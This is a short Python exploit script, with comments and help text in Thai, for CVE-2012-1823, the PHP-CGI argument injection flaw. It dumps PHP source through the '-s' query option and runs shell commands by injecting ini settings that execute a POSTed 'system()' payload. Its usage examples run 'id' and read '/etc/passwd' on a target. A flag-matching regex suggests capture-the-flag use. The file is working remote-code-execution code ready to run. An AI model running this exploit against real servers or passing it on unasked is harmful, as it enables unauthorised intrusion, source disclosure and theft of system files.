#!/usr/bin/env python3
"""PHP-CGI argument injection (CVE-2012-1823).

PHP ที่รันเป็น CGI จะตีความ query string เป็น command-line option
ทำให้ผู้โจมตีสั่ง `-s` (แสดง source) หรือ `-d` (แก้ ini) ได้

ตัวอย่าง
-------
python tools/php_cgi_cve_2012_1823.py --url http://target/index.php --source
python tools/php_cgi_cve_2012_1823.py --url http://target/index.php --cmd id
python tools/php_cgi_cve_2012_1823.py --url http://target/index.php --cmd "cat /etc/passwd"

หมายเหตุ: ต้องเป็น PHP แบบ CGI/SAPI ที่ยังไม่แพตช์ (PHP < 5.3.12 / 5.4.2)
"""

import argparse
import html
import json
import re
import sys

try:
    import requests
except ImportError:
    sys.exit("ต้องติดตั้ง requests ก่อน: pip install requests")

try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass


def dump_source(session, url):
    r = session.get(url + "?-s", timeout=30)
    text = html.unescape(re.sub(r"<[^>]+>", "", r.text))
    return r.status_code, text.replace("\xa0", " ")


def rce(session, url, cmd):
    target = url + "?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"
    payload = ("<?php system(%s); ?>" % json.dumps(cmd)).encode()
    r = session.post(target, data=payload, timeout=60)
    return r.status_code, r.text


def main():
    ap = argparse.ArgumentParser(description="CVE-2012-1823 PHP-CGI argument injection")
    ap.add_argument("--url", required=True, help="http://target/index.php")
    ap.add_argument("--source", action="store_true", help="ดึง source ด้วย -s")
    ap.add_argument("--cmd", help="รันคำสั่ง shell ผ่าน auto_prepend_file=php://input")
    args = ap.parse_args()

    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    url = args.url.rstrip("/")

    if not args.source and not args.cmd:
        args.source = True

    if args.source:
        code, text = dump_source(s, url)
        print("[*] -s -> HTTP %s" % code)
        print(text)
        flags = re.findall(r"[A-Za-z0-9_]{2,20}\{[^}\n]{3,80}\}", text)
        if flags:
            print("[+] flag-like strings:", ", ".join(sorted(set(flags))))

    if args.cmd:
        code, text = rce(s, url, args.cmd)
        print("[*] cmd -> HTTP %s" % code)
        print(text)


if __name__ == "__main__":
    main()
